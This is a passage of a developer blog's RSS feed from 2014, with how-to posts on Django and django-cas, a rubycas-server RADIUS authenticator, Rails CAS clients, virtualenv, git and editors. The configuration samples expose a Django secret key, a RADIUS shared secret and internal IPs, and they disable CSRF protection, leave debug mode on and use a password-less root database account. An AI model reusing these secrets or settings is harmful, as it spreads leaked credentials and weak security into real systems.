      <description>&lt;p&gt;follow this post: &lt;a href="https://docs.djangoproject.com/en/1.5/topics/auth/#installation" target="_blank"&gt;https://docs.djangoproject.com/en/1.5/topics/auth/#installation&lt;/a&gt;&amp;#160;&lt;/p&gt;
&lt;p&gt;1. add these lines to file: &lt;/p&gt;
&lt;pre&gt;# in settings.py file:
122 INSTALLED_APPS = (
123     'django.contrib.auth',
124     'django.contrib.contenttypes',
         .....

 98 MIDDLEWARE_CLASSES = (
 99     'django.middleware.common.CommonMiddleware',
102     'django.contrib.auth.middleware.AuthenticationMiddleware',
       ....

&lt;/pre&gt;
&lt;p&gt; 2.  create database:  $ python manage.py syncdb &lt;/p&gt;</description>
      <pubDate>Fri, 14 Feb 2014 06:28:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/install-django-auth</link>
    </item>
    <item>
      <title>ubuntu13 下无法安装 python-dev 的解决办法 (problem-installing-python-dev in ubuntu 13  )</title>
      <description>&lt;p&gt;昨天废了很多时间来装 django-cas, 其中就要用到 python的mysql 客户端。 解决遇到问题： &amp;#160; ( it costs me hours to solve this problem when installing python mysql client: )&lt;/p&gt;
&lt;pre&gt;The following packages have unmet dependencies:
 python-dev : Depends: python (= 2.7.3-0ubuntu2) but 2.7.3-0ubuntu2.2 is to be installed
              Depends: python2.7-dev (&amp;gt;= 2.7.3) but it is not going to be installed
&lt;/pre&gt;
&lt;p&gt;搜了N久，才发现了这个不错的解决办法： (apt-get install -f, 也不行。） &amp;#160;貌似直接下载 &amp;#160;tar.gz, 然后 make install... 忘记行不行了。。。 &amp;#160;(after googled a lot, I found this solution)&amp;#160;&lt;/p&gt;
&lt;p&gt;$ echo "deb http://us.archive.ubuntu.com/ubuntu/ precise-updates main restricted" | sudo tee -a /etc/apt/sources.list.d/precise-updates.list&lt;br /&gt;$ sudo apt-get update&lt;br /&gt;$ sudo apt-get install python2.7-dev&lt;/p&gt;
&lt;p&gt;原文见： (refer to &lt;a href="http://askubuntu.com/questions/275861/problem-installing-python-dev" target="_blank"&gt;http://askubuntu.com/questions/275861/problem-installing-python-dev&lt;/a&gt;)&lt;/p&gt;</description>
      <pubDate>Fri, 14 Feb 2014 02:56:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/problem-installing-python-dev-in-ubuntu13</link>
    </item>
    <item>
      <title>使用django-cas (using django-cas)</title>
      <description>&lt;p&gt;步骤：&lt;/p&gt;
&lt;p&gt;$ git clone &amp;lt;your project&amp;gt; &amp;amp;&amp;amp; cd &amp;lt;your project&amp;gt;&lt;/p&gt;
&lt;p&gt;$ load your virtualenv for python&amp;#160;&lt;/p&gt;
&lt;p&gt;$ hg clone https://bitbucket.org/cpcc/django-cas
&lt;/p&gt;
&lt;p&gt;$ python setup.py install
&lt;/p&gt;
&lt;p&gt;$&amp;#160;pip install MySQL-python
&lt;/p&gt;
&lt;p&gt;if you met problems installing python-dev in ubuntu13, try this approach:&amp;#160;&lt;br /&gt;$ echo "deb http://us.archive.ubuntu.com/ubuntu/ precise-updates main restricted" | sudo tee -a /etc/apt/sources.list.d/precise-updates.list&lt;br /&gt;sudo apt-get update&lt;br /&gt;sudo apt-get install python2.7-dev&lt;/p&gt;
&lt;p&gt;$ use django's auth module, even if you are using mongodb. (see: &lt;a href="https://docs.djangoproject.com/en/dev/topics/auth/" target="_blank"&gt;https://docs.djangoproject.com/en/dev/topics/auth/&lt;/a&gt; )setup your local database: &lt;/p&gt;
&lt;pre&gt;$ create a database named 'm_tv_box_ms'
$ create a table named 'user'
$ 
&lt;/pre&gt;
&lt;p&gt;$ 向 settings.py 中加入以下内容：
&lt;/p&gt;
&lt;pre&gt;# tv_cms/manage.py:
os.environ.setdefault("DJANGO_SETTINGS_MODULE", "tv_cms.settings")

# tv_cms/wsgi.py:
os.environ['DJANGO_SETTINGS_MODULE'] = 'tv_cms.settings'

# tv_cms/tv_cms/wsgi.py
os.environ.setdefault("DJANGO_SETTINGS_MODULE", "tv_cms.settings")
&lt;/pre&gt;
&lt;p&gt;== Installation == (follow &lt;a href="https://bitbucket.org/cpcc/django-cas/" target="_blank"&gt;https://bitbucket.org/cpcc/django-cas/&lt;/a&gt; )&amp;#160;&lt;/p&gt;
&lt;p&gt;Run `python setup.py install`, or place the `django_cas` directory in your&lt;br /&gt;`PYTHONPATH` directly. (Note: If you're using Python 2.4 or older, you'll need&lt;br /&gt;to install [http://pypi.python.org/pypi/elementtree/ ElementTree] to use&lt;br /&gt;CAS 2.0 functionality.)&lt;/p&gt;
&lt;p&gt;Now add it to the middleware and authentication backends in your settings.&lt;br /&gt;Make sure you also have the authentication middleware installed. Here's what&lt;br /&gt;mine looks like:&lt;/p&gt;
&lt;p&gt;{{{&lt;br /&gt;MIDDLEWARE_CLASSES = (&lt;br /&gt;    'django.middleware.common.CommonMiddleware',&lt;br /&gt;    'django.contrib.sessions.middleware.SessionMiddleware',&lt;br /&gt;    'django.contrib.auth.middleware.AuthenticationMiddleware',&lt;br /&gt;    'django_cas.middleware.CASMiddleware',&lt;br /&gt;    'django.middleware.doc.XViewMiddleware',&lt;br /&gt;)&lt;/p&gt;
&lt;p&gt;AUTHENTICATION_BACKENDS = (&lt;br /&gt;    'django.contrib.auth.backends.ModelBackend',&lt;br /&gt;    'django_cas.backends.CASBackend',&lt;br /&gt;)&lt;br /&gt;}}}&lt;/p&gt;
&lt;p&gt;Set the following required setting in `settings.py`:&lt;/p&gt;
&lt;p&gt;    * `CAS_SERVER_URL`: This is the only setting you must explicitly define.&lt;br /&gt;      Set it to the base URL of your CAS source (e.g.&lt;br /&gt;      http://sso.some.edu/cas/).&lt;/p&gt;
&lt;p&gt; your settings.py: &lt;/p&gt;
&lt;pre&gt;# tv_cms/settings.py
sg552@youku:/sg552/workspace/m-tv-box-ms$ cat tv_cms/tv_cms/settings.py
# Django settings for tv_cms project.

import os
DEBUG = True
TEMPLATE_DEBUG = DEBUG
PROJECT_DIR = os.path.sep.join(os.path.realpath(__file__).split(os.path.sep)[:-2])

ADMINS = (
    ('Siwei', 'shensiwei@youku.com'),
)

MANAGERS = ADMINS

DATABASES = {
    'default': {
        'ENGINE': 'django.db.backends.mysql', # Add 'postgresql_psycopg2', 'mysql', 'sqlite3' or 'oracle'.
        'NAME': 'm_tv_box_ms',                      # Or path to database file if using sqlite3.
        # The following settings are not used with sqlite3:
        'USER': 'root',
        'PASSWORD': '',
        'HOST': 'localhost',                      # Empty for localhost through domain sockets or '127.0.0.1' for localhost through TCP.
        'PORT': '',                      # Set to empty string for default.
    }
}

# Hosts/domain names that are valid for this site; required if DEBUG is False
# See https://docs.djangoproject.com/en/1.5/ref/settings/#allowed-hosts
ALLOWED_HOSTS = []

# Local time zone for this installation. Choices can be found here:
# http://en.wikipedia.org/wiki/List_of_tz_zones_by_name
# although not all choices may be available on all operating systems.
# In a Windows environment this must be set to your system time zone.
TIME_ZONE = 'Asia/Shanghai'

# Language code for this installation. All choices can be found here:
# http://www.i18nguy.com/unicode/language-identifiers.html
LANGUAGE_CODE = 'en-us'

SITE_ID = 1

# If you set this to False, Django will make some optimizations so as not
# to load the internationalization machinery.
USE_I18N = True

# If you set this to False, Django will not format dates, numbers and
# calendars according to the current locale.
USE_L10N = True

# If you set this to False, Django will not use timezone-aware datetimes.
USE_TZ = True

# Absolute filesystem path to the directory that will hold user-uploaded files.
# Example: "/var/www/example.com/media/"
MEDIA_ROOT = ''

# URL that handles the media served from MEDIA_ROOT. Make sure to use a
# trailing slash.
# Examples: "http://example.com/media/", "http://media.example.com/"
MEDIA_URL = ''

# Absolute path to the directory static files should be collected to.
# Don't put anything in this directory yourself; store your static files
# in apps' "static/" subdirectories and in STATICFILES_DIRS.
# Example: "/var/www/example.com/static/"
STATIC_ROOT = ''

# URL prefix for static files.
# Example: "http://example.com/static/", "http://static.example.com/"
STATIC_URL = '/statics/'

# Additional locations of static files
STATICFILES_DIRS = (
    # Put strings here, like "/home/html/static" or "C:/www/django/static".
    # Always use forward slashes, even on Windows.
    # Don't forget to use absolute paths, not relative paths.
    PROJECT_DIR +STATIC_URL,
)

# List of finder classes that know how to find static files in
# various locations.
STATICFILES_FINDERS = (
    'django.contrib.staticfiles.finders.FileSystemFinder',
    'django.contrib.staticfiles.finders.AppDirectoriesFinder',
#    'django.contrib.staticfiles.finders.DefaultStorageFinder',
)

# Make this unique, and don't share it with anybody.
SECRET_KEY = '#jl(@ux!rshzu34uq^8mz9o#ea0ybiy0g==z&amp;amp;mfrk#5#u#y9d='

# List of callables that know how to import templates from various sources.
TEMPLATE_LOADERS = (
    'django.template.loaders.filesystem.Loader',
    'django.template.loaders.app_directories.Loader',
#     'django.template.loaders.eggs.Loader',
)

MIDDLEWARE_CLASSES = (
    'django.middleware.common.CommonMiddleware',
    'django.contrib.sessions.middleware.SessionMiddleware',
    # 'django.middleware.csrf.CsrfViewMiddleware',
    'django.contrib.auth.middleware.AuthenticationMiddleware',
    'django_cas.middleware.CASMiddleware',
    'django.contrib.messages.middleware.MessageMiddleware',
    # Uncomment the next line for simple clickjacking protection:
    # 'django.middleware.clickjacking.XFrameOptionsMiddleware',
    'django.middleware.doc.XViewMiddleware',
)

ROOT_URLCONF = 'tv_cms.urls'

# Python dotted path to the WSGI application used by Django's runserver.
WSGI_APPLICATION = 'tv_cms.wsgi.application'

TEMPLATE_DIRS = (
    # Put strings here, like "/home/html/django_templates" or "C:/www/django/templates".
    # Always use forward slashes, even on Windows.
    # Don't forget to use absolute paths, not relative paths.
    'templates',
)

INSTALLED_APPS = (
    'django.contrib.auth',
    'django.contrib.contenttypes',
    'django.contrib.sessions',
    'django.contrib.sites',
    'django.contrib.messages',
    'django.contrib.staticfiles',
    # Uncomment the next line to enable the admin:
    # 'django.contrib.admin',
    # Uncomment the next line to enable admin documentation:
    # 'django.contrib.admindocs',
    'tv_cms',
    'interface',
    'django_cas',
)

AUTHENTICATION_BACKENDS = (
    'django.contrib.auth.backends.ModelBackend',
    'django_cas.backends.CASBackend',
)

CAS_SERVER_URL='http://10.103.13.121:3535/'

SESSION_SERIALIZER = 'django.contrib.sessions.serializers.JSONSerializer'

# A sample logging configuration. The only tangible logging
# performed by this configuration is to send an email to
# the site admins on every HTTP 500 error when DEBUG=False.
# See http://docs.djangoproject.com/en/dev/topics/logging for
# more details on how to customize your logging configuration.
LOGGING = {
    'version': 1,
    'disable_existing_loggers': False,
    'filters': {
        'require_debug_false': {
            '()': 'django.utils.log.RequireDebugFalse'
        }
    },
    'handlers': {
        'mail_admins': {
            'level': 'ERROR',
            'filters': ['require_debug_false'],
            'class': 'django.utils.log.AdminEmailHandler'
        }
    },
    'loggers': {
        'django.request': {
            'handlers': ['mail_admins'],
            'level': 'ERROR',
            'propagate': True,
        },
    }
}
 
&lt;/pre&gt;</description>
      <pubDate>Thu, 13 Feb 2014 10:00:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/using-django-cas</link>
    </item>
    <item>
      <title>virtual env 的使用。 python 环境的切换 ( using virtualenv as python development environment )</title>
      <description>&lt;p&gt;工作中需要用到 python ( django, pyramid ) , 深感 自己 python知识的浅薄，所以记录下来。&lt;/p&gt;

&lt;pre&gt;pip install virtualenv
mkdir django_env
cd django_env
virtualenv --no-site-packages django_env
cd django_env
source bin/activate
&lt;/pre&gt;
&lt;p&gt;run server:&lt;/p&gt;
&lt;p&gt;$&amp;#160;django-admin.py runserver&amp;#160;&lt;/p&gt;</description>
      <pubDate>Thu, 13 Feb 2014 06:48:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/using-virtualenv-for-python-development</link>
    </item>
    <item>
      <title>在RAILS中使用CAS 客户端（ cas client for rails) </title>
      <description>&lt;p&gt;Ruby 客户端 使用方法&lt;br /&gt;0. 在 Gemfile中，加入：&lt;/p&gt;
&lt;p&gt;gem 'rubycas-client'&lt;br /&gt;然后 $sudo bundle&lt;/p&gt;
&lt;p&gt;注意： 不要使用 'rubycas-client-rails' 这个GEM。这个gem会使得你的配置过程不透明，难于调试。&lt;br /&gt;1. environment.rb: 的结尾，加上：&lt;/p&gt;
&lt;p&gt;CASClient::Frameworks::Rails::Filter.configure(&lt;br /&gt;  :cas_base_url =&amp;gt; "http://10.103.13.121:333"&lt;br /&gt;)&lt;br /&gt;2 对应的controller 中， 加上：&lt;/p&gt;
&lt;p&gt;before_filter CASClient::Frameworks::Rails::Filter&lt;br /&gt;注意： 不要在 application_controller中加这句。否则的话所有的controller, 包括登录页面都会受影响。&lt;br /&gt;3. 在sessions_controller.rb 中定义退出的action:&lt;/p&gt;
&lt;p&gt;class SessionsController &amp;lt; ApplicationController&lt;br /&gt;  def destroy&lt;br /&gt;    CASClient::Frameworks::Rails::Filter.logout(self)&lt;br /&gt;  end&lt;br /&gt;end&lt;br /&gt;4. 修改 route.rb ，加入退出的链接：&lt;/p&gt;
&lt;p&gt;PaddyField::Application.routes.draw do&lt;br /&gt;   resources :fish&lt;br /&gt;   match '/logout' =&amp;gt; "sessions#destroy", :as =&amp;gt; :logout, :via =&amp;gt; :delete&lt;br /&gt;end &lt;br /&gt;5. 修改 application.html.erb 布局文件，增加这个链接。&lt;/p&gt;
&lt;p&gt;关键的一点是： 在经典的rails authorization 框架用，都是用 current_user 这个变量取得当前登陆的用户。 在CAS CLIENT中，用的是 session[:cas_user] , 只取得当前用户名，是一个string. 而不是一个model.&lt;br /&gt;&amp;lt;div style="border: 1px solid green"&amp;gt;&lt;br /&gt;  &amp;lt;%= session[:cas_user] %&amp;gt; &lt;br /&gt;&amp;lt;/div&amp;gt;&lt;br /&gt;&amp;lt;% if session[:cas_user] %&amp;gt;&lt;br /&gt;  &amp;lt;%= link_to "logout" , logout_path %&amp;gt; &lt;br /&gt;&amp;lt;% end %&amp;gt;&lt;/p&gt;</description>
      <pubDate>Mon, 10 Feb 2014 01:00:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/cas-client-for-rails</link>
    </item>
    <item>
      <title>搭建CAS 的简要步骤（ setup your CAS )</title>
      <description>&lt;p&gt;copied from our wiki page. in Chinese. &amp;#160;&lt;/p&gt;
&lt;p&gt;搭建步骤&lt;br /&gt;1. 取出代码&lt;/p&gt;
&lt;p&gt; $git clone ssh://&amp;lt;换成你的用户名&amp;gt;@gforge.1verge.net:22022/gitroot/m-cas&lt;br /&gt;2. cd rubycas-server&lt;/p&gt;
&lt;p&gt;3. cp config/config.example.yml config.yml&lt;/p&gt;
&lt;p&gt;4. 编辑config.yml ， 这个是最核心的配置，里面的项目很多，但是注释的很全面，所以理解起来很快。&lt;/p&gt;
&lt;p&gt;4.1 Change the database driver to mysql2&lt;br /&gt;4.2 最少要有一个认证方式（Authenticator) Configure at least one authenticator&lt;br /&gt;4.3 （可选）You might want to change log.file to something local, so that you don't need root. For example just casserver.log&lt;br /&gt;4.4 （可选）You might also want to disable SSL for now by commenting out the ssl_cert line and changing the port to something like 8888&lt;br /&gt;5. 建立数据库 (记得跟config.yml 文件一致）&lt;/p&gt;
&lt;p&gt;  $ mysqladmin -u root create casserver  &lt;br /&gt;6. 修改现有的Gemfile.&lt;/p&gt;
&lt;p&gt;gem "mysql2"  &lt;br /&gt;gem "radiustar"   # 我们使用 RADIUS的认证方式&lt;br /&gt;7. $ bundle install:&lt;/p&gt;
&lt;p&gt;8. $ bundle exec rubycas-server -c config.yml&lt;/p&gt;
&lt;p&gt;9. 增加新的 authenticator .&lt;/p&gt;
&lt;p&gt;1. $ copy the RADIUS directory files. &lt;br /&gt;2. $ write the authenticate.rb file .e.g.&lt;br /&gt;#  lib/authentication_tool.rb&lt;br /&gt;require 'rubygems'&lt;br /&gt;require 'radiustar'&lt;br /&gt;class AuthenticationTool&lt;br /&gt;  RADIUT_CLIENT_IP = '10.103.13.121'&lt;br /&gt;  RADIUT_SERVER_IP = '10.10.0.20'&lt;br /&gt;  PUBLIC_KEY = 'YoukuRadius'&lt;br /&gt;  DIRECTORY_FOLDER = '/opt/app/ruby/rubycas-server/lib/radius_dictionary_folder'&lt;br /&gt;  def self.authenticate_using_radiut username, password&lt;br /&gt;    auth_custom_attr = { 'NAS-IP-Address' =&amp;gt; RADIUT_CLIENT_IP }&lt;br /&gt; &lt;br /&gt;    req = Radiustar::Request.new(RADIUT_SERVER_IP,&lt;br /&gt;      { :dict =&amp;gt; Radiustar::Dictionary.new(DIRECTORY_FOLDER) })&lt;br /&gt; &lt;br /&gt;    begin&lt;br /&gt;      reply = req.authenticate(username, password, PUBLIC_KEY, auth_custom_attr)&lt;br /&gt;      #reply example: {:code=&amp;gt;"Access-Accept", "Framed-Protocol"=&amp;gt;PPP, "Service-Type"=&amp;gt;Framed-User, "Class&lt;br /&gt;      puts "== Radiut reply : #{reply.inspect}"&lt;br /&gt;      return reply[:code] == 'Access-Accept'&lt;br /&gt;    rescue Exception =&amp;gt; e&lt;br /&gt;      puts "== exception: #{e.inspect}"&lt;br /&gt;      puts "== #{e.backtrace.join("\n")}"&lt;br /&gt;      return false&lt;br /&gt;    end &lt;br /&gt;  end &lt;br /&gt;end&lt;br /&gt;3. 增加 这个文件：&lt;/p&gt;
&lt;p&gt;# lib/casserver/authenticators/radius.rb&lt;br /&gt;require 'rubygems'&lt;br /&gt;require 'radiustar'&lt;br /&gt;require 'authentication_tool'&lt;br /&gt;require 'casserver/authenticators/base'&lt;br /&gt; &lt;br /&gt;# 定制的Radius 验证&lt;br /&gt;module CASServer&lt;br /&gt;    module Authenticators&lt;br /&gt;        class Radius &amp;lt;&lt;br /&gt;            CASServer::Authenticators::Base&lt;br /&gt;          def validate(credentials)&lt;br /&gt;            read_standard_credentials(credentials)&lt;br /&gt;            return false if @password.blank?&lt;br /&gt;            return AuthenticationTool.authenticate_using_radiut(@username, @password)&lt;br /&gt;          end&lt;br /&gt;        end&lt;br /&gt;    end&lt;br /&gt;end&lt;br /&gt;4. 为 lib/casserver.rb 加上一行：&lt;/p&gt;
&lt;p&gt;CASServer::Authenticators.autoload :Radius, 'casserver/authenticators/radius.rb'&lt;/p&gt;</description>
      <pubDate>Mon, 10 Feb 2014 00:58:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/setup-your-cas</link>
    </item>
    <item>
      <title>selecting a web host(如何选择主机，主机空间, web host)</title>
      <description>&lt;p&gt;refer to &lt;a href="http://stackoverflow.com/questions/2339324/selecting-a-rails-host/21640941#21640941" target="_blank"&gt;http://stackoverflow.com/questions/2339324/selecting-a-rails-host/21640941#21640941&lt;/a&gt;
&lt;/p&gt;&lt;p&gt;简言之， 忘记heroku, 尽情的使用linode吧， 260块钱一个月，2G内存， 用起来跟独立的机器一样。 而HEROKU把太多LINUX 的功能抽取出了service, 用起来不方便，而且一旦脱离了heroku 环境，你发现自己将失去一切。 &amp;#160;&lt;/p&gt;
&lt;p&gt;linode 使你成为 前途光明的 LINUX 专家。&amp;#160;&lt;br /&gt;heroku 把你死死的绑在它的船上。&lt;/p&gt;
&lt;p&gt;I prefer linode, aws or so.&lt;/p&gt;
&lt;p&gt;linode : is a standard linux server. you can login, install 3rd party dependencies and play around just like in your own server. Installing nginx/rails/ruby is the same way as what you did on your own pc/laptop/server.&lt;/p&gt;
&lt;p&gt;heroku : is a service. I have learn lots of stuffs that is not valuable if one day you switch to another platform(e.g. linode) or you have your own real server. for example, check the logs, install databases, or install gems. I have printed out most of its documents and read them in 1/2 days, and then I realize that I can't use this knowledges in my working server( that my company offered to me)&lt;/p&gt;
&lt;p&gt;linode is cheap enough, $20 per month.&lt;/p&gt;
&lt;p&gt;heroku is not always free. and I don't think it's stable enough for demonstration purpose.(e.g. your free heroku app will fall in sleep in spare time, and will cost your several seconds to wake up. this SEVERAL seconds is long enough to make you lost your customers if they want FAST web app )&lt;br /&gt;so, forget heroku, buy or setup your own VPS, use it for years, then you will be an linux expert.&lt;/p&gt;
</description>
      <pubDate>Sat, 08 Feb 2014 01:58:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/selecting-a-web-host</link>
    </item>
    <item>
      <title>install refinery_cms using mysql</title>
      <description>&lt;p&gt;refinery_cms is not bad. I have been using it for my personal website(siwei.me, aka shensiwei.com), its default database is sqlite3. this guide will show you how to install it under mysql.&lt;/p&gt;
&lt;p&gt;step1. $ gem install refinery cms &amp;#160;(following it official guide)&lt;/p&gt;
&lt;p&gt;step1.1 $ gem install sass-rails -v 3.2.3&amp;#160;&lt;/p&gt;
&lt;p&gt;setp1.2 $&amp;#160;apt-get install libsqlite3-dev&amp;#160;&lt;/p&gt;
&lt;p&gt;step 1.9 $ refinerycms yangqigong (using the &amp;#160;default settings)&lt;/p&gt;
&lt;p&gt;step2. $ vim Gemfile , config/database.yml, using mysql content. e.g.&lt;/p&gt;
&lt;pre&gt;# Gemfile:
 gem 'rails', '3.2.15'
 gem 'mysql2', '0.2.6'

# database.yml
development:
  adapter: mysql2
  encoding: utf8
  reconnect: false
  database: yangqigong_development
  #database: yangqigong_development_two
  pool: 5
  username: root
  password: ""
  host: localhost&lt;/pre&gt;
&lt;p&gt;Step3. $ bundle install &amp;amp;&amp;amp; bundle exec rake db:create &amp;amp;&amp;amp; bundle exec rake db:migrate&lt;/p&gt;
&lt;p&gt;it's done. run 'bundle exec rails s' will start your application.&amp;#160;&lt;/p&gt;</description>
      <pubDate>Wed, 05 Feb 2014 01:26:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/install-refinery_cms-using-mysql</link>
    </item>
    <item>
      <title>如何将fork的project 更新到最新（how to make your forked project to up-to-date. )</title>
      <description>&lt;p&gt;我有个项目，去年forked，今年重新捡起来，打算弄一下。( Today I am going to continue one of my forked projects that created last year)&lt;/p&gt;
&lt;p&gt;git的原理是： 在远程可以有多个 repo (最熟悉的就是 origin 啦). 所以，我们只要加入想merge的 remote &amp;#160;repo就可以了。( To make its code to the latest, I have to merge the original remote repo to my remote repo. )&lt;/p&gt;
&lt;pre&gt;$ git remote add root_origin https://github.com/refinery/refinerycms.git
$ git pull root_origin master:master ( means merge the master from root_origin to local's master)
$ (manually merge) 
$ git push origin master:master( push local's commits to your origin remote repo)
&lt;/pre&gt;
&lt;p&gt;refer to : &lt;a href="http://stackoverflow.com/questions/9529497/what-is-origin-in-git" target="_blank"&gt;http://stackoverflow.com/questions/9529497/what-is-origin-in-git&lt;/a&gt;
&lt;/p&gt;</description>
      <pubDate>Wed, 05 Feb 2014 00:47:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/how-to-make-your-forked-project-to-update-to-date</link>
    </item>
    <item>
      <title>remove blank lines in VIM</title>
      <description>&lt;p&gt;&amp;#160;:g/^$/d&lt;/p&gt;
&lt;p&gt;:g will execute a command on lines which match a regex. The regex is 'blank line' and the command is :d (delete)&lt;/p&gt;
&lt;p&gt; refer to: &lt;a href="http://stackoverflow.com/questions/706076/vim-delete-blank-lines" target="_blank"&gt;http://stackoverflow.com/questions/706076/vim-delete-blank-lines&lt;/a&gt;
&lt;/p&gt;</description>
      <pubDate>Sun, 02 Feb 2014 10:18:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/remove-blank-lines-in-vim</link>
    </item>
    <item>
      <title>tooltip:  jquery-ui v.s. bootstrap (注意： bootstrap 与 jquery-ui 的tooltip组件会起冲突！导致bootstrap tooltip不生效～)</title>
      <description>&lt;p&gt;如题。 如果你同时使用了jquery-ui 与 bootstrap, 那么只有 jquery-ui对应的tooltip组件才会生效！！！ ( you can't use the tooltip from bootstrap if already using jquery-ui )&amp;#160;&lt;/p&gt;</description>
      <pubDate>Sat, 01 Feb 2014 08:02:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/tooltip-war-jquery-ui-override-bootstrap</link>
    </item>
    <item>
      <title>tinymce --- another good wysiwyg editor (rails中使用tinymce) </title>
      <description>&lt;p&gt;在rails 中的使用方式： 建议使用 gem 来做。否则一点儿一点儿的copy assets ，很麻烦。(it's strongly recommended we use the gem instead of adding files to app/assets image/stylesheets manually. &lt;/p&gt;
&lt;p&gt;see: &lt;a href="https://github.com/spohlenz/tinymce-rails/tree/tinymce-4" target="_blank"&gt;https://github.com/spohlenz/tinymce-rails/tree/tinymce-4&lt;/a&gt;
&lt;/p&gt;
&lt;p&gt;p.s. my tinymce.yml:&amp;#160;&lt;/p&gt;
&lt;pre&gt;siwei@siwei-Lenovo-V470c:/workspace/rails_girls_cn$ cat config/tinymce.yml 
theme_advanced_toolbar_location: top
theme_advanced_toolbar_align: left
theme_advanced_statusbar_location: bottom
theme_advanced_buttons3_add:
  - tablecontrols
  - fullscreen
plugins:
  - table
  - fullscreen
  - code
  - contextmenu
  - image
  - link
  - preview
  - charmap

&lt;/pre&gt;</description>
      <pubDate>Sat, 01 Feb 2014 07:28:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/using-tinymce-in-rails</link>
    </item>
    <item>
      <title>rails4中使用wysihtml5 editor (using wysihtml5 editor in rails4)</title>
      <description>&lt;p&gt;NOTICE: please use tinymce instead. ( 请使用 tinymce), refer to: &lt;a href="http://siwei.me/blog/posts/using-tinymce-in-rails" target="_blank"&gt;http://siwei.me/blog/posts/using-tinymce-in-rails&lt;/a&gt;
&lt;/p&gt;
&lt;p&gt;steps:&lt;/p&gt;
&lt;p&gt;1. download the source code from &lt;a href="https://github.com/xing/wysihtml5/wiki/Getting-Started" target="_blank"&gt;official website&lt;/a&gt;
&lt;/p&gt;
&lt;p&gt;2. in your page:
&lt;/p&gt;
&lt;pre&gt;&amp;lt;script src="/path-to-wysihtml5/parser_rules/advanced.js"&amp;gt;
&amp;lt;script src="/path-to-wysihtml5/dist/wysihtml5-0.3.0.min.js"&amp;gt;
&lt;/pre&gt;
&lt;p&gt; create the tool bar
&lt;/p&gt;
&lt;pre&gt;    &amp;lt;div id="wysihtml5-toolbar" style='display:none;'&amp;gt;
      &amp;lt;header&amp;gt;
        &amp;lt;ul class="commands"&amp;gt;
          &amp;lt;li data-wysihtml5-command="bold" title="Make text bold (CTRL + B)" class="command"&amp;gt;&amp;lt;/li&amp;gt;
          &amp;lt;li data-wysihtml5-command="italic" title="Make text italic (CTRL + I)" class="command"&amp;gt;&amp;lt;/li&amp;gt;
          &amp;lt;li data-wysihtml5-command="insertUnorderedList" title="Insert an unordered list" class="command"&amp;gt;&amp;lt;/li&amp;gt;
          &amp;lt;li data-wysihtml5-command="insertOrderedList" title="Insert an ordered list" class="command"&amp;gt;&amp;lt;/li&amp;gt;
          &amp;lt;li data-wysihtml5-command="createLink" title="Insert a link" class="command"&amp;gt;&amp;lt;/li&amp;gt;
          &amp;lt;li data-wysihtml5-command="insertImage" title="Insert an image" class="command"&amp;gt;&amp;lt;/li&amp;gt;
          &amp;lt;li data-wysihtml5-command="formatBlock" data-wysihtml5-command-value="h1" title="Insert headline 1" class="command"&amp;gt;&amp;lt;/li&amp;gt;
          &amp;lt;li data-wysihtml5-command="formatBlock" data-wysihtml5-command-value="h2" title="Insert headline 2" class="command"&amp;gt;&amp;lt;/li&amp;gt;
          &amp;lt;li data-wysihtml5-command-group="foreColor" class="fore-color" title="Color the selected text" class="command"&amp;gt;
            &amp;lt;ul&amp;gt;
              &amp;lt;li data-wysihtml5-command="foreColor" data-wysihtml5-command-value="silver"&amp;gt;&amp;lt;/li&amp;gt;
              &amp;lt;li data-wysihtml5-command="foreColor" data-wysihtml5-command-value="gray"&amp;gt;&amp;lt;/li&amp;gt;
              &amp;lt;li data-wysihtml5-command="foreColor" data-wysihtml5-command-value="maroon"&amp;gt;&amp;lt;/li&amp;gt;
              &amp;lt;li data-wysihtml5-command="foreColor" data-wysihtml5-command-value="red"&amp;gt;&amp;lt;/li&amp;gt;
              &amp;lt;li data-wysihtml5-command="foreColor" data-wysihtml5-command-value="purple"&amp;gt;&amp;lt;/li&amp;gt;
              &amp;lt;li data-wysihtml5-command="foreColor" data-wysihtml5-command-value="green"&amp;gt;&amp;lt;/li&amp;gt;
              &amp;lt;li data-wysihtml5-command="foreColor" data-wysihtml5-command-value="olive"&amp;gt;&amp;lt;/li&amp;gt;
              &amp;lt;li data-wysihtml5-command="foreColor" data-wysihtml5-command-value="navy"&amp;gt;&amp;lt;/li&amp;gt;
              &amp;lt;li data-wysihtml5-command="foreColor" data-wysihtml5-command-value="blue"&amp;gt;&amp;lt;/li&amp;gt;
            &amp;lt;/ul&amp;gt;
          &amp;lt;/li&amp;gt;
          &amp;lt;li data-wysihtml5-command="insertSpeech" title="Insert speech" class="command"&amp;gt;&amp;lt;/li&amp;gt;
          &amp;lt;li data-wysihtml5-action="change_view" title="Show HTML" class="action"&amp;gt;&amp;lt;/li&amp;gt;
        &amp;lt;/ul&amp;gt;
      &amp;lt;/header&amp;gt;
      &amp;lt;div data-wysihtml5-dialog="createLink" style="display: none;"&amp;gt;
        &amp;lt;label&amp;gt;
          Link:
          &amp;lt;input data-wysihtml5-dialog-field="href" value="http://"&amp;gt;
        &amp;lt;/label&amp;gt;
        &amp;lt;a data-wysihtml5-dialog-action="save"&amp;gt;OK&amp;lt;/a&amp;gt;&amp;#160;&amp;lt;a data-wysihtml5-dialog-action="cancel"&amp;gt;Cancel&amp;lt;/a&amp;gt;
      &amp;lt;/div&amp;gt;

      &amp;lt;div data-wysihtml5-dialog="insertImage" style="display: none;"&amp;gt;
        &amp;lt;label&amp;gt;
          Image:
          &amp;lt;input data-wysihtml5-dialog-field="src" value="http://"&amp;gt;
        &amp;lt;/label&amp;gt;
        &amp;lt;a data-wysihtml5-dialog-action="save"&amp;gt;OK&amp;lt;/a&amp;gt;&amp;#160;&amp;lt;a data-wysihtml5-dialog-action="cancel"&amp;gt;Cancel&amp;lt;/a&amp;gt;
      &amp;lt;/div&amp;gt;
    &amp;lt;/div&amp;gt;
&lt;/pre&gt;
&lt;p&gt;use this css file: &amp;#160;(save as: &amp;#160;wysihtml5.css )&lt;/p&gt;
